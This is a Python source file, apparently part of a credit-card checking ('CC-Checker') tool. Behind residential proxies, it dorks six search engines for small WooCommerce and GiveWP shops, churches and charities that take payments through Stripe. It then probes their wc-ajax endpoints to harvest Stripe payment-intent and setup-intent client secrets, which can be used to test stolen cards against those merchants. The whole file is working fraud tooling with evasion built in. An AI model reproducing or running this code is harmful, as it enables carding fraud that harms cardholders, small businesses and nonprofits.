"""
core/auto_discover.py — Smart Site Discovery Engine v6

Search Sources (all via residential proxy):
  1. Google  — Best results, largest index
  2. Bing    — Good for e-commerce, less strict
  3. Yahoo   — Uses Bing backend, different results
  4. DuckDuckGo — Anonymous, good coverage
  5. Yandex  — Global, finds sites others miss
  6. WordPress.org — Direct WC forum mining
  7. Pre-built US seed sites — Always available

All engines run in PARALLEL for maximum speed.
Proxy makes ALL engines work — no blocking.
"""
import asyncio
import re
import random
import logging
from urllib.parse import urlencode, urlparse, unquote

import aiohttp
from aiohttp import ClientTimeout

from core.site_seeds import (
    US_WOOCOMMERCE_SEEDS,
    US_GOOGLE_DORKS,
    US_DDG_QUERIES,
    WP_ORG_PAGES,
)

logger = logging.getLogger("CC-Checker.AutoDiscover")

PAGE_TIMEOUT  = ClientTimeout(total=20)
PROBE_TIMEOUT = ClientTimeout(total=8)

BROWSER_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/125.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

SKIP_DOMAINS = {
    "stripe.com", "shopify.com", "woocommerce.com", "wordpress.com",
    "wordpress.org", "github.com", "stackoverflow.com", "reddit.com",
    "gofundme.com", "kickstarter.com", "patreon.com", "paypal.com",
    "google.com", "bing.com", "duckduckgo.com", "yahoo.com",
    "amazon.com", "twitter.com", "facebook.com", "youtube.com",
    "medium.com", "linkedin.com", "instagram.com", "tiktok.com",
    "docs.stripe.com", "dev.stripe.com", "yandex.com", "yandex.ru",
    "wikipedia.org", "wikimedia.org",
}

SKIP_KEYWORDS = [
    "docs.", "support.", "help.", "blog.", "forum.", "news.",
    "/docs/", "/blog/", "/support/", "/help/", "/tutorial",
    "github.io", ".edu", ".gov",
]

SECRET_RE = re.compile(
    r'(?:pi|seti)_[a-zA-Z0-9_\-]{10,100}_secret_[a-zA-Z0-9]{10,60}'
)

# ── Dorks for each engine ──────────────────────────────────────────────────────
GOOGLE_DORKS = [
    '"wc_stripe_params" "pk_live_"',
    'inurl:checkout "woocommerce" "stripe" -site:woocommerce.com',
    '"add-to-cart" woocommerce "stripe" site:.com',
    '"wc-ajax=stripe_create_payment_intent"',
    'site:.org "give" "stripe" donate checkout',
    '"give_stripe" OR "give-stripe" donate',
    'church "online giving" stripe',
    '"woocommerce_stripe_params" site:.com',
    '"powered by woocommerce" stripe checkout',
    'inurl:donate "stripe" nonprofit',
]

BING_DORKS = [
    'woocommerce stripe checkout "add to cart" site:.com',
    '"pk_live_" woocommerce checkout',
    '"wc-ajax" stripe payment intent',
    '"give stripe" donation nonprofit site:.org',
    'church donate online stripe payment',
    'woocommerce payment stripe small business',
    '"woocommerce" "stripe" shop online usa',
    'nonprofit charity stripe donate online',
    '"add to cart" shop stripe checkout',
    'online store woocommerce stripe payment gateway',
]

YAHOO_DORKS = [
    '"woocommerce" "stripe" checkout us shop',
    'donate "stripe" online nonprofit church',
    '"pk_live_" site:.com',
    'woocommerce stripe shop "add to cart"',
    'give stripe donate church nonprofit',
]

DDG_DORKS = [
    'woocommerce stripe checkout shop',
    '"wc_stripe_params" site:com',
    'give donate stripe nonprofit checkout site:org',
    'woocommerce stripe payment us shop online',
    '"added to cart" woocommerce stripe checkout',
    'church donate online stripe give checkout',
]

YANDEX_DORKS = [
    'woocommerce stripe checkout "add to cart"',
    '"pk_live_" woocommerce site:com',
    'donate stripe give nonprofit',
]


def _is_valid_target(url: str) -> bool:
    try:
        p = urlparse(url)
        domain = p.netloc.lower().lstrip("www.")
        for skip in SKIP_DOMAINS:
            if domain == skip or domain.endswith("." + skip):
                return False
        full = url.lower()
        if any(kw in full for kw in SKIP_KEYWORDS):
            return False
        return p.scheme.startswith("http") and "." in domain
    except Exception:
        return False


def _base(url: str) -> str:
    try:
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}" if p.netloc else ""
    except Exception:
        return ""


def _extract_urls_from_html(html: str, existing: set) -> list[str]:
    """Generic URL extractor from any search engine HTML."""
    found = []
    # General href pattern
    for m in re.finditer(r'href=["\']?(https?://[^"\'\s<>&]+)', html):
        raw  = unquote(m.group(1).rstrip("&"))
        base = _base(raw)
        if base and base not in existing and _is_valid_target(raw):
            existing.add(base)
            found.append(base)
    return found


# ── Google ────────────────────────────────────────────────────────────────────
async def _google_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 20,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        for start in [0, 10, 20]:  # 3 pages = 30 results
            search_url = "https://www.google.com/search?" + urlencode({
                "q": query, "num": "10", "hl": "en", "gl": "us", "start": str(start),
            })
            kw = {
                "timeout": PAGE_TIMEOUT, "ssl": False,
                "headers": {
                    **BROWSER_HEADERS,
                    "Referer": "https://www.google.com/",
                    "User-Agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
                    ]),
                },
            }
            kw.update(proxy_kwargs)
            async with session.get(search_url, **kw) as r:
                if r.status != 200:
                    break
                html = await r.text(errors="ignore")

            # Google result URLs
            for m in re.finditer(r'/url\?q=(https?://[^&"]+)&', html):
                raw  = unquote(m.group(1))
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    if len(urls) >= max_results:
                        return urls

            await asyncio.sleep(random.uniform(1.5, 3.0))

        logger.info(f"Google: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"Google error: {e}")
    return urls


# ── Bing ──────────────────────────────────────────────────────────────────────
async def _bing_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 20,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        for first in [1, 11, 21]:  # 3 pages
            search_url = "https://www.bing.com/search?" + urlencode({
                "q": query, "first": str(first), "count": "10", "mkt": "en-US",
            })
            kw = {
                "timeout": PAGE_TIMEOUT, "ssl": False,
                "headers": {
                    **BROWSER_HEADERS,
                    "Referer": "https://www.bing.com/",
                },
            }
            kw.update(proxy_kwargs)
            async with session.get(search_url, **kw) as r:
                if r.status != 200:
                    break
                html = await r.text(errors="ignore")

            # Bing uses <a href="http..." h="ID=...">
            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]*h="ID=SERP', html):
                raw  = m.group(1)
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    if len(urls) >= max_results:
                        return urls

            # Alternative Bing pattern
            for m in re.finditer(r'"url":"(https?://[^"]+)"', html):
                raw  = unquote(m.group(1))
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    if len(urls) >= max_results:
                        return urls

            await asyncio.sleep(random.uniform(1.0, 2.5))

        logger.info(f"Bing: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"Bing error: {e}")
    return urls


# ── Yahoo ─────────────────────────────────────────────────────────────────────
async def _yahoo_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 15,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        search_url = "https://search.yahoo.com/search?" + urlencode({
            "p": query, "n": "50", "ei": "UTF-8", "fl": "1", "vl": "lang_en",
        })
        kw = {
            "timeout": PAGE_TIMEOUT, "ssl": False,
            "headers": {
                **BROWSER_HEADERS,
                "Referer": "https://search.yahoo.com/",
            },
        }
        kw.update(proxy_kwargs)
        async with session.get(search_url, **kw) as r:
            if r.status != 200:
                return []
            html = await r.text(errors="ignore")

        # Yahoo redirects through /RU=https%3A%2F%2F...
        for m in re.finditer(r'/RU=(https?%3A%2F%2F[^/]+)', html):
            raw  = unquote(m.group(1))
            base = _base(raw)
            if base and base not in seen and _is_valid_target(raw):
                seen.add(base)
                urls.append(base)
                if len(urls) >= max_results:
                    break

        # Also raw hrefs
        for m in re.finditer(r'href="(https?://[^"]+)"', html):
            raw  = m.group(1)
            base = _base(raw)
            if base and base not in seen and _is_valid_target(raw):
                seen.add(base)
                urls.append(base)
                if len(urls) >= max_results:
                    break

        logger.info(f"Yahoo: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"Yahoo error: {e}")
    return urls


# ── DuckDuckGo ────────────────────────────────────────────────────────────────
async def _ddg_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 15,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        search_url = "https://html.duckduckgo.com/html/?" + urlencode({
            "q": query, "kl": "us-en", "kp": "-1", "k1": "-1",
        })
        kw = {
            "timeout": PAGE_TIMEOUT, "ssl": False,
            "headers": {**BROWSER_HEADERS, "Referer": "https://duckduckgo.com/"},
        }
        kw.update(proxy_kwargs)
        async with session.get(search_url, **kw) as r:
            if r.status != 200:
                return []
            html = await r.text(errors="ignore")

        for m in re.finditer(r"uddg=([^&\"'\s<>]+)", html):
            raw  = unquote(m.group(1))
            if not raw.startswith("http"):
                continue
            base = _base(raw)
            if base and base not in seen and _is_valid_target(raw):
                seen.add(base)
                urls.append(base)
                if len(urls) >= max_results:
                    break

        logger.info(f"DDG: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"DDG error: {e}")
    return urls


# ── Yandex ────────────────────────────────────────────────────────────────────
async def _yandex_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 15,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        search_url = "https://yandex.com/search/?" + urlencode({
            "text": query, "lr": "10393",  # US region
        })
        kw = {
            "timeout": PAGE_TIMEOUT, "ssl": False,
            "headers": {
                **BROWSER_HEADERS,
                "Referer": "https://yandex.com/",
            },
        }
        kw.update(proxy_kwargs)
        async with session.get(search_url, **kw) as r:
            if r.status != 200:
                return []
            html = await r.text(errors="ignore")

        # Yandex result URLs
        for m in re.finditer(r'"url":"(https?://[^"]+)"', html):
            raw  = unquote(m.group(1))
            base = _base(raw)
            if base and base not in seen and _is_valid_target(raw):
                seen.add(base)
                urls.append(base)
                if len(urls) >= max_results:
                    break

        for m in re.finditer(r'href="(https?://[^"]+)"[^>]*class="[^"]*organic', html):
            raw  = m.group(1)
            base = _base(raw)
            if base and base not in seen and _is_valid_target(raw):
                seen.add(base)
                urls.append(base)
                if len(urls) >= max_results:
                    break

        logger.info(f"Yandex: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"Yandex error: {e}")
    return urls


# ── WordPress.org mining ──────────────────────────────────────────────────────
async def _scrape_wordpress_org(
    session: aiohttp.ClientSession,
    proxy_kwargs: dict,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    for source in WP_ORG_PAGES[:4]:
        try:
            kw = {"timeout": PAGE_TIMEOUT, "ssl": False, "headers": BROWSER_HEADERS}
            kw.update(proxy_kwargs)
            async with session.get(source, **kw) as r:
                if r.status != 200:
                    continue
                html = await r.text(errors="ignore")
            for m in re.finditer(r'href="(https?://[^"]+)"', html):
                u = m.group(1)
                if "wordpress.org" in u:
                    continue
                base = _base(u)
                if base and base not in seen and _is_valid_target(u):
                    seen.add(base)
                    urls.append(base)
            await asyncio.sleep(0.5)
        except Exception as e:
            logger.debug(f"WP.org error {source}: {e}")
    logger.info(f"WordPress.org: {len(urls)} sites")
    return urls


# ── Pre-built seed sites ───────────────────────────────────────────────────────
def get_seed_sites(count: int = 30) -> list[str]:
    seeds = [s for s in US_WOOCOMMERCE_SEEDS if s.startswith("http")]
    random.shuffle(seeds)
    return seeds[:count]


# ── WooCommerce fast endpoint prober ──────────────────────────────────────────
async def probe_woocommerce_endpoint(
    session: aiohttp.ClientSession,
    base_url: str,
    proxy_kwargs: dict,
) -> dict | None:
    """Directly probe WooCommerce Stripe endpoint. Returns info if working."""
    endpoints = [
        "/?wc-ajax=stripe_create_payment_intent",
        "/?wc-ajax=create_stripe_setup_intent",
        "/?wc-ajax=wc_stripe_create_payment_intent",
        "/?give_action=create_payment_intent",
    ]
    headers = {
        "User-Agent": BROWSER_HEADERS["User-Agent"],
        "Accept": "application/json, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
    }
    for ep in endpoints:
        full = base_url.rstrip("/") + ep
        try:
            kw = {
                "timeout": PROBE_TIMEOUT, "ssl": False,
                "allow_redirects": False,
                "headers": headers,
                "data": "amount=100&currency=usd&nonce=abc",
            }
            kw.update(proxy_kwargs)
            async with session.post(full, **kw) as r:
                if r.status in (200, 201):
                    text = await r.text(errors="ignore")
                    m = SECRET_RE.search(text)
                    if m:
                        secret = m.group(0)
                        return {
                            "base_url": base_url,
                            "endpoint": ep,
                            "client_secret": secret,
                            "intent_type": "setup_intent" if secret.startswith("seti_") else "payment_intent",
                        }
        except Exception:
            pass
    return None


# ── Main discovery ────────────────────────────────────────────────────────────
async def discover_stripe_sites(
    count: int = 30,
    proxy: dict = None,
    progress_cb=None,
) -> list[str]:
    """
    Discover WooCommerce+Stripe sites using ALL search engines in parallel.

    Uses Google + Bing + Yahoo + DuckDuckGo + Yandex + WordPress.org
    All via residential proxy for best results.
    """
    all_urls: set[str] = set()
    found_list: list[str] = []

    # Seed sites — always included
    seeds = get_seed_sites(min(count, len(US_WOOCOMMERCE_SEEDS)))
    all_urls.update(seeds)
    found_list.extend(seeds)
    logger.info(f"Seeds: {len(seeds)}")
    if progress_cb:
        await progress_cb(len(all_urls), count)

    if not proxy:
        logger.warning("No proxy — seed sites only")
        random.shuffle(found_list)
        return found_list[:count]

    from core.proxy_manager import get_connector, get_proxy_kwargs
    connector    = get_connector(proxy)
    proxy_kwargs = get_proxy_kwargs(proxy)

    async with aiohttp.ClientSession(connector=connector) as session:

        # Run ALL engines in parallel per batch
        logger.info("Starting parallel multi-engine search...")

        async def run_engine(name: str, coro_fn, dorks: list, max_per: int = 20):
            """Run one search engine across dorks — more dorks for larger count."""
            engine_urls = []
            # Scale how many dorks we use based on requested count
            n_dorks = min(len(dorks), max(3, count // 30))
            selected_dorks = random.sample(dorks, n_dorks) if n_dorks < len(dorks) else dorks
            for dork in selected_dorks:
                try:
                    per_query = max(20, count // max(n_dorks, 1))
                    results = await coro_fn(session, dork, proxy_kwargs, per_query)
                    new = [u for u in results if u not in all_urls]
                    all_urls.update(new)
                    engine_urls.extend(new)
                    if progress_cb:
                        await progress_cb(len(all_urls), count)
                    await asyncio.sleep(random.uniform(1.0, 2.5))
                except Exception as e:
                    logger.debug(f"{name} dork error: {e}")
            logger.info(f"{name} total: {len(engine_urls)} new sites")
            return engine_urls

        # Run Google, Bing, Yahoo, DDG, Yandex in PARALLEL
        tasks = [
            run_engine("Google",  _google_search,  GOOGLE_DORKS,  25),
            run_engine("Bing",    _bing_search,    BING_DORKS,    25),
            run_engine("Yahoo",   _yahoo_search,   YAHOO_DORKS,   20),
            run_engine("DDG",     _ddg_search,     DDG_DORKS,     20),
            run_engine("Yandex",  _yandex_search,  YANDEX_DORKS,  15),
        ]
        engine_results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in engine_results:
            if isinstance(res, list):
                found_list.extend(res)

        # WordPress.org mining
        wp_urls = await _scrape_wordpress_org(session, proxy_kwargs)
        new_wp  = [u for u in wp_urls if u not in all_urls]
        all_urls.update(new_wp)
        found_list.extend(new_wp)
        if progress_cb:
            await progress_cb(len(all_urls), count)

    # Final dedup + shuffle — NO cap (return all found, caller can slice)
    seen_final: set[str] = set()
    unique: list[str] = []
    for u in found_list:
        if u not in seen_final:
            seen_final.add(u)
            unique.append(u)

    random.shuffle(unique)
    # Only cap if count is reasonable, otherwise return everything found
    if count < 500:
        unique = unique[:count]
    logger.info(f"Discovery done: {len(unique)} unique sites from {len(all_urls)} total found")
    return unique


# ── Fast batch WooCommerce prober ─────────────────────────────────────────────
async def fast_woocommerce_scan(
    domains: list[str],
    proxy: dict = None,
    progress_cb=None,
) -> list[dict]:
    """Probe list of domains for open WooCommerce Stripe endpoints."""
    working: list[dict] = []
    done    = 0
    sem     = asyncio.Semaphore(10)

    proxy_kwargs = {}
    if proxy:
        from core.proxy_manager import get_connector, get_proxy_kwargs
        connector    = get_connector(proxy)
        proxy_kwargs = get_proxy_kwargs(proxy)
    else:
        connector = aiohttp.TCPConnector(ssl=False, limit=10)

    async with aiohttp.ClientSession(connector=connector) as session:

        async def probe(domain: str):
            nonlocal done
            async with sem:
                result = await probe_woocommerce_endpoint(session, domain, proxy_kwargs)
                if result:
                    working.append(result)
                done += 1
                if progress_cb:
                    await progress_cb(done, len(domains), len(working))

        await asyncio.gather(*[probe(d) for d in domains])

    logger.info(f"Fast WC scan: {len(working)}/{len(domains)} working")
    return working
